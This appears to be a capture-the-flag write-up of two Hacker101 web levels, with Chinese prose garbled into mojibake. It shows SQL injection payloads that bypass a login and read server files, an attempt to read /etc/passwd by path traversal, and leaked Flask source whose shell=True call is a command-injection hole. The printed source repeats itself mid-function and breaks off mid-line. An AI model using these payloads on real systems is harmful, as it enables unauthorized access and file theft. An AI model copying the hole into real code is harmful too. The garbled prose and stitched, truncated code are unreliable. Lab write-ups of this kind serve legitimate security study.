<h2 id="Micro-CMS-v2"><a href="#Micro-CMS-v2" class="headerlink" title="Micro-CMS v2"></a>Micro-CMS v2</h2><h3 id="flag0-1"><a href="#flag0-1" class="headerlink" title="flag0"></a>flag0</h3><p>é¢˜ç›®æ˜¯sqlæ³¨å…¥<br>å°è¯• <code>admin</code> å‘ç°å›æ˜¾æ˜¯ <code>Unknown user</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3917aj30hg0bxwem.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu3917aj30hg0bxwem.jpg" class="lazyload" title="test"></a></p>
<p>æ³¨å…¥ <code>admin&#39;</code> å‘ç°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"./main.py"</span>, line <span class="number">145</span>, <span class="keyword">in</span> do_login</span><br><span class="line">    <span class="keyword">if</span> cur.execute(<span class="string">'SELECT password FROM admins WHERE username=\'</span>%s\<span class="string">''</span> % request.form[<span class="string">'username'</span>].replace(<span class="string">'%'</span>, <span class="string">'%%'</span>)) == <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py"</span>, line <span class="number">255</span>, <span class="keyword">in</span> <span class="keyword">execute</span></span><br><span class="line">    self.errorhandler(<span class="keyword">self</span>, exc, <span class="keyword">value</span>)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py"</span>, line <span class="number">50</span>, <span class="keyword">in</span> defaulterrorhandler</span><br><span class="line">    <span class="keyword">raise</span> errorvalue</span><br><span class="line">ProgrammingError: (<span class="number">1064</span>, <span class="string">"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin''' at line 1"</span>)</span><br></pre></td></tr></table></figure></div>

<p>å°è¯•æ³¨å…¥ <code>admin&#39; or &#39;&#39;=&#39;</code> (ä¸æ˜¯åŒå¼•å· æ˜¯ä¸¤ä¸ªå•å¼•å·)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu39getj30gl0awwem.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu39getj30gl0awwem.jpg" class="lazyload" title="test"></a></p>
<p>å›æ˜¾å˜æˆäº† <code>Invalid password</code>, è¯´æ˜ <code>admin&#39; or &#39;&#39;=&#39;</code> è™½ç„¶ä¸å­˜åœ¨ï¼Œä½†è¢«è®¤ä¸ºæ˜¯åˆæ³•çš„ç”¨æˆ·åï¼Œæ‰€ä»¥ä¾æ®åé¦ˆçš„ä¸åŒå¯ä»¥è¿›è¡Œå¸ƒå°”æ³¨å…¥<br>çœ‹äº†hint æœ‰ä¸ªæç¤ºæ˜¯</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Getting admin access might require a more perfect union</span><br></pre></td></tr></table></figure></div>

<p>å°è¯•ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·å:admin&#39; union select &#39;123456</span><br><span class="line">ç”¨æˆ·å:123456</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu393ilj30g008o74l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g43vu393ilj30g008o74l.jpg" class="lazyload" title="test"></a></p>
<p>ç™»é™†æˆåŠŸ å›æ˜¾å‡ºä¸€ä¸ªæ–°çš„ <code>Private Page</code> ï¼Œç‚¹å¼€å¾—åˆ°flag</p>
<hr>
<h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>hint2 å¦‚ä¸‹</p>
<blockquote>
<p>What actions could you perform as a regular user on the last level, which you canâ€™t now?<br>Just because request fails with one method doesnâ€™t mean it will fail with a different method<br>Different requests often have different required authorizationã€‚</p>
</blockquote>
<p>è²Œä¼¼æ˜¯è¦ç”¨ä¸åŒçš„è¯·æ±‚æ–¹æ³•å»è¯·æ±‚åŸæœ¬è®¿é—®ä¸äº†çš„é¡µé¢ï¼Œåˆšåˆšçš„Private pageçš„urlä¸ºpage/3,å…¶ç¼–è¾‘é¡µé¢ä¸ºpage/edit/3ï¼Œè¿™ä¸¤ä¸ªé¡µé¢éƒ½æ˜¯éœ€è¦ç™»é™†æ‰èƒ½è®¿é—®çš„ï¼Œæˆ‘ä»¬ä¾ç…§æç¤ºæ¢ä¸€ä¸‹è¯·æ±‚æ–¹æ³•ä¸ºPOSTï¼ŒæˆåŠŸè·å–äº†flag1ï¼š</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqeqqdj316r08mabr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqeqqdj316r08mabr.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="Photo-Gallery"><a href="#Photo-Gallery" class="headerlink" title="Photo Gallery"></a>Photo Gallery</h2><h3 id="flag0-2"><a href="#flag0-2" class="headerlink" title="flag0"></a>flag0</h3><p>ç‚¹å¼€é¢˜ç›®ï¼Œçœ‹åˆ°çš„æ˜¯è¿™ä¸ªæ ·å­çš„å›¾</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr0gb4j30p80sx11i.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr0gb4j30p80sx11i.jpg" class="lazyload" title="test"></a></p>
<p>å‘ç°æœ‰å¼ å›¾çœ‹ä¸åˆ°ï¼Œæ¥ç€æŸ¥çœ‹æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Magical Image Gallery<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Magical Image Gallery<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Kittens<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"fetch?id=1"</span> <span class="attr">width</span>=<span class="string">"266"</span> <span class="attr">height</span>=<span class="string">"150"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Utterly adorable<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"fetch?id=2"</span> <span class="attr">width</span>=<span class="string">"266"</span> <span class="attr">height</span>=<span class="string">"150"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Purrfect<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"fetch?id=3"</span> <span class="attr">width</span>=<span class="string">"266"</span> <span class="attr">height</span>=<span class="string">"150"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Invisible<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>Space used: 0	total<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ä»æºç ä¸­å¯ä»¥çœ‹å‡ºæ¥ï¼ŒçŒ«çš„å›¾ç‰‡æ˜¯é€šè¿‡ <code>fetch?id=X</code> è¿™ç§æ–¹å¼åŠ è½½çš„,æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®ä¸€ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqxp9aj31710oodlt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqxp9aj31710oodlt.jpg" class="lazyload" title="test"></a></p>
<p>ä¼¼ä¹è¿”å›äº†ä¸€å¼ å›¾ç‰‡çš„å†…å®¹ï¼Œæˆ‘ä»¬åœ¨linuxä¸‹æ‰§è¡Œ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqviqlj30ts03cjtr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqviqlj30ts03cjtr.jpg" class="lazyload" title="test"></a></p>
<p>å°†è¿™æ®µä¿¡æ¯ä¿å­˜ä¸º <code>1.jpg</code> ï¼ŒæŸ¥çœ‹å¯ä»¥çœ‹åˆ°è¿™çš„ç¡®æ˜¯ç¬¬ä¸€å¼ çŒ«çš„ç…§ç‰‡ã€‚æˆ‘ä»¬å†è®¿é—® <code>fetch?id=2</code>ï¼ŒåŒæ ·è¿”å›äº†ç¬¬äºŒå¼ çŒ«çš„ç…§ç‰‡å†…å®¹ï¼›ç„¶åå°è¯• <code>fetch?id=2-1</code>ï¼Œ å‘ç°å›æ˜¾çš„æ˜¯ç¬¬ä¸€ä¸ªå›¾ç‰‡çš„å†…å®¹ï¼Œ<code>2-1</code> è¢«è§£æäº†ï¼Œé‚£ä¹ˆidå‚æ•°å¾ˆå¯èƒ½ä¼ é€’åˆ°äº†åå°è„šæœ¬çš„æ•°æ®åº“é€»è¾‘ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œå¾ˆå¯èƒ½æœ‰æ³¨å…¥<br>ï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯sqlmapä¸€æŠŠæ¢­ï¼‰</p>
<p>ç„¶åå¾—åˆ°äº†ä¸¤å¼ è¡¨<br>Table1:albums</p>
<p><strong>id title</strong><br>1 Kittens<br>Table:photos</p>
<p><strong>| id title | Parent filename |</strong><br>|1 Utterly adorable | 1    files/adorable.jpg|<br>|2 Purrent | 1     files/purrfect.jpg|<br>|3 Invisible | 1 f8f1e29a43623363a3f53cede84d8c845a1c58076bcbf668c5372b593b7ef71d|</p>
<p>è™½ç„¶æ²¡æœ‰flagï¼Œä½†æ˜¯çœ‹åˆ°è¡¨ <code>photo</code> ä¸­çš„ <code>filename</code> æ–‡ä»¶æ˜¾ç¤ºäº†ç…§ç‰‡çš„å‚¨å­˜è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåå°å¤„ç†é€»è¾‘ä¸Šé€šè¿‡URLä¸­ä¼ é€’<code>id</code>å‚æ•°ï¼Œæ¥ä»æ•°æ®åº“è·å¾—ç…§ç‰‡æ–‡ä»¶è·¯å¾„ï¼Œç„¶åé€šè¿‡è¯»å–æ–‡ä»¶è¿”å›ç»™æˆ‘ä»¬ï¼ŒçŒœæµ‹sqlè¯­å¥æ˜¯è¿™ä¹ˆå†™çš„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> filename <span class="keyword">from</span> photo <span class="keyword">where</span> <span class="keyword">id</span> = N;</span><br></pre></td></tr></table></figure></div>

<p>æ—¢ç„¶å­˜åœ¨sqlæ¼æ´ï¼Œæˆ‘ä»¬ä»¥æ­¤æ§åˆ¶sqlçš„æŸ¥è¯¢ç»“æœä¹Ÿå°±æ˜¯filenameï¼Œè¿›è€Œè¯»å–æˆ‘ä»¬æ§åˆ¶çš„filenameï¼Œä»¥æ­¤éªŒè¯ä¸€ä¸‹ï¼Œå…ˆè®¿é—®URLï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;4</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqb8m3j30vl0700sy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqb8m3j30vl0700sy.jpg" class="lazyload" title="test"></a></p>
<p>å¦‚æ•°æ®åº“ç»“æœæ‰€å‘ˆç°ï¼Œè¡¨photosä¸­id=4æ—¶æ²¡æœ‰å¯¹åº”è®°å½•,ç„¶åè®¿é—®urlï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;4 union select &#39;files&#x2F;adorable.jpg&#39; --</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lrqwq3j311k0gcadj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lrqwq3j311k0gcadj.jpg" class="lazyload" title="test"></a></p>
<p>å¥ˆæ–¯ï¼Œç„¶åå°è¯•å‰ä¸ä¹…å­¦çš„å‘½ä»¤æ‰§è¡Œæ¼æ´</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;4 union select &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#39; --</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqv5goj30vq07bmxi.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqv5goj30vq07bmxi.jpg" class="lazyload" title="test"></a></p>
<p>å‘ç°ä¸å¤ªè¡Œï¼Œå¯èƒ½æ˜¯åå°é€»è¾‘å¯¹è¯»å–æ–‡ä»¶è·¯å¾„è¿›è¡Œäº†å¤„ç†ï¼Œ<code>waf</code> äº† <code>..</code>ï¼Œæˆ‘è¯•äº†ä¸€ä¸‹è®¿é—®URL</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;4 union select &#39;files&#x2F;a..dorable.jpg&#39; --</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqwza2j314z0jjtd3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lqwza2j314z0jjtd3.jpg" class="lazyload" title="test"></a></p>
<p>ä¼¼ä¹åªèƒ½è¯»å½“å‰ç›®å½•åŠå­ç›®å½•äº†ï¼Œçœ‹èƒ½ä¸èƒ½è¯»å–ä¸»é¡µä»£ç ï¼Œå°è¯•è®¿é—®url:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;4 union select &#39;index.php&#39; --</span><br><span class="line">fetch?id&#x3D;4 union select &#39;index.html&#39; --</span><br></pre></td></tr></table></figure></div>
<p>æŸ¥çœ‹hintåï¼Œå‘ç°æ˜¯ä¸€ä¸ª<code>uwsgi-nginx-flask</code>æ¡†æ¶</p>
<blockquote>
<p>uWSGIæ˜¯ä¸€ä¸ªWebæœåŠ¡å™¨ï¼Œå®ƒå®ç°äº†WSGIåè®®ã€uwsgiã€httpç­‰åè®®ã€‚Nginxä¸­HttpUwsgiModuleçš„ä½œç”¨æ˜¯ä¸uWSGIæœåŠ¡å™¨è¿›è¡Œäº¤æ¢ã€‚WSGIæ˜¯ä¸€ç§WebæœåŠ¡å™¨ç½‘å…³æ¥å£ã€‚å®ƒæ˜¯ä¸€ä¸ªWebæœåŠ¡å™¨ï¼ˆå¦‚nginxï¼ŒuWSGIç­‰æœåŠ¡å™¨ï¼‰ä¸webåº”ç”¨ï¼ˆå¦‚ç”¨Flaskæ¡†æ¶å†™çš„ç¨‹åºï¼‰é€šä¿¡çš„ä¸€ç§è§„èŒƒã€‚</p>
</blockquote>
<p>ç™¾åº¦æŸ¥çœ‹äº†å…¶éƒ¨ç½²æ¡†æ¶ï¼Œå¤§æ¦‚å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|____docker-compose.yaml</span><br><span class="line">|____web</span><br><span class="line">| |____Dockerfile</span><br><span class="line">| |____entrypoint.sh</span><br><span class="line">| |____start.sh</span><br><span class="line">| |____app</span><br><span class="line">| | |______init__.py</span><br><span class="line">| | |____models.py</span><br><span class="line">| | |____views.py</span><br><span class="line">| | |____requirements.txt</span><br><span class="line">| | |____utils.py</span><br><span class="line">| | |____helper.py</span><br><span class="line">| | |____settings.py</span><br><span class="line">| | |____app.py</span><br><span class="line">| | |____uwsgi.ini</span><br><span class="line">|____README.md</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker-compose.yamlå’Œwebæ–‡ä»¶å¤¹å’Œæœ€å¤–å±‚readme.mdåŒç›®å½•</span><br><span class="line">webä¸‹é¢ï¼šDockerfileï¼Œ entrypoint.shï¼Œ start.sh, app</span><br><span class="line">appä¸‹é¢ï¼šapp.py, uwsgi.ini, requirements.txt, models.py, views.pyç­‰</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­uwsgi.iniæ˜¯uWSGIçš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®url:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;4 union select &#39;uwsgi.ini&#39; --</span><br></pre></td></tr></table></figure></div>

<p>è¯»å–äº†å®ƒçš„å†…å®¹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[uwsgi] module &#x3D; main callable &#x3D; app</span><br></pre></td></tr></table></figure></div>

<p>æŸ¥çœ‹Uwsgiå‚æ•°å®šä¹‰<br><code>module = main</code><br>è¡¨ç¤ºåŠ è½½ä¸€ä¸ªmain.pyè¿™ä¸ªæ¨¡å—ï¼Œè¿™åº”è¯¥æ˜¯è¿™ä¸ªwebåº”ç”¨çš„ä¸»è¦ä»£ç ï¼Œæˆ‘ä»¬ç»§ç»­è¯»å–main.py</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr52p7j312u0j240g.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9lr52p7j312u0j240g.jpg" class="lazyload" title="test"></a></p>
<p>main.pyçš„ä»£ç æ•´ç†å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, redirect, request, Response</span><br><span class="line"><span class="keyword">import</span> base64, json, MySQLdb, os, re, subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">home = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;Magical Image Gallery&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$ALBUMS$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">viewAlbum = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;$TITLE$ -- Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;$TITLE$&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$GALLERY$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDb</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> MySQLdb.connect(host=<span class="string">"localhost"</span>, user=<span class="string">"root"</span>, password=<span class="string">""</span>, db=<span class="string">"level5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(data)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> data.replace(<span class="string">'&amp;'</span>, <span class="string">'&amp;amp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>).replace(<span class="string">'"'</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	cur.execute(<span class="string">'SELECT id, title FROM albums'</span>)</span><br><span class="line">	albums = list(cur.fetchall())</span><br><span class="line"></span><br><span class="line">	rep = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> id, title <span class="keyword">in</span> albums:</span><br><span class="line">		rep += <span class="string">'&lt;h2&gt;%s&lt;/h2&gt;\n'</span> % sanitize(title)</span><br><span class="line">		rep += <span class="string">'&lt;div&gt;'</span></span><br><span class="line">		cur.execute(<span class="string">'SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'</span>, (id, ))</span><br><span class="line">		fns = []</span><br><span class="line">		<span class="keyword">for</span> pid, ptitle, pfn <span class="keyword">in</span> cur.fetchall():</span><br><span class="line">			rep += <span class="string">'&lt;div&gt;&lt;img src ="fetch?id=%i" width="266" height="150"&gt;&lt;br&gt;%s&lt;/div&gt;'</span> % (pid, sanitize(ptitle))</span><br><span class="line">			fns.append(pfn)</span><br><span class="line">		rep += <span class="string">'&lt;i&gt;Space used: '</span> + subprocess.check_output(<span class="string">'du -ch %s || exit 0'</span> % <span class="string">' '</span>.join(<span class="string">'files/'</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">'\n'</span>, <span class="number">1</span>)[<span class="number">-1</span>] + <span class="string">'&lt;/i&gt;'</span></span><br><span class="line">		rep += <span class="string">'&lt;/div&gt;\n'</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> home.replace(<span class="string">'$ALBUMS$'</span>, rep)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/fetch')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">()</span>:</span></span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	<span class="keyword">if</span> cur.execute(<span class="string">'SELECT filename FROM photos WHERE id=%s'</span> % request.args[<span class="string">'id'</span>]) == <span class="number">0</span>:</span><br><span class="line">		abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># It's dangerous to go alone, take this:</span></span><br><span class="line">	<span class="comment"># from flask import Flask, abort, redirect, request, Response</span></span><br><span class="line"><span class="keyword">import</span> base64, json, MySQLdb, os, re, subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">home = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;Magical Image Gallery&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$ALBUMS$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">viewAlbum = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;$TITLE$ -- Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;$TITLE$&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$GALLERY$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDb</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> MySQLdb.connect(host=<span class="string">"localhost"</span>, user=<span class="string">"root"</span>, password=<span class="string">""</span>, db=<span class="string">"level5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(data)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> data.replace(<span class="string">'&amp;'</span>, <span class="string">'&amp;amp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>).replace(<span class="string">'"'</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	cur.execute(<span class="string">'SELECT id, title FROM albums'</span>)</span><br><span class="line">	albums = list(cur.fetchall())</span><br><span class="line"></span><br><span class="line">	rep = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> id, title <span class="keyword">in</span> albums:</span><br><span 